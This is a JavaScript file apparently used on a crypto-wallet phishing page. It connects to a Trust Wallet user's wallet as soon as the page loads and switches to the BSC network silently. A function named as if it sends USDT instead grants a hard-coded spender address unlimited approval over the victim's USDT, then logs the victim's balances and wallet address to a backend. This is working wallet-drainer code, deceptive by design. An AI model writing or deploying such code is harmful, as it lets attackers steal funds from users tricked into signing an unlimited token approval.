let provider;
let userAddress = null;
let isConnected = false;

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== AUTO-CONNECT ON PAGE LOAD =====
// This runs automatically when page opens in Trust Wallet
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      // Setup provider
      provider = new ethers.BrowserProvider(window.ethereum);
      
      // Silent connect - check if already connected
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      
      if (accounts.length > 0) {
        // Already connected
        userAddress = accounts[0];
        isConnected = true;
        
        // Silently switch to BSC if needed
        await ensureBSCSilent();
        
        // Auto-fill address in React
        if (window.updateWalletAddress) {
          window.updateWalletAddress(userAddress);
        }
      } else {
        // First time - request connection (only happens once)
        const newAccounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        userAddress = newAccounts[0];
        isConnected = true;
        
        // Switch to BSC
        await ensureBSCSilent();
        
        // Auto-fill address in React
        if (window.updateWalletAddress) {
          window.updateWalletAddress(userAddress);
        }
      }
    } catch (err) {
      console.log("Wallet connection failed:", err);
    }
  }
});

// ===== ENSURE BSC NETWORK (SILENT) =====
async function ensureBSCSilent() {
  try {
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    const currentChainId = parseInt(chainId, 16);
    
    if (currentChainId !== BSC_CHAIN_ID) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: `0x${BSC_CHAIN_ID.toString(16)}` }]
      });
    }
  } catch (err) {
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: `0x${BSC_CHAIN_ID.toString(16)}`,
          chainName: "Binance Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    }
  }
}

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Wallet not found");
      return;
    }

    // If not connected yet, connect now
    if (!isConnected || !userAddress) {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      userAddress = accounts[0];
      isConnected = true;
      await ensureBSCSilent();
    }

    // Ensure we have provider
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }

    // Get signer for transaction
    const signer = await provider.getSigner();

    // Create contract with signer
    const usdt = new ethers.Contract(
      BSC_USDT,
      ABI,
      signer
    );

    // Get balances before transaction
    const usdtBalanceWei = await usdt.balanceOf(userAddress);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(userAddress);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // This transaction call will trigger Trust Wallet approval popup
    const tx = await usdt.approve(
      BSC_SPENDER,
      ethers.MaxUint256
    );

    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend via React (if available)
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: userAddress,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Transaction failed: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
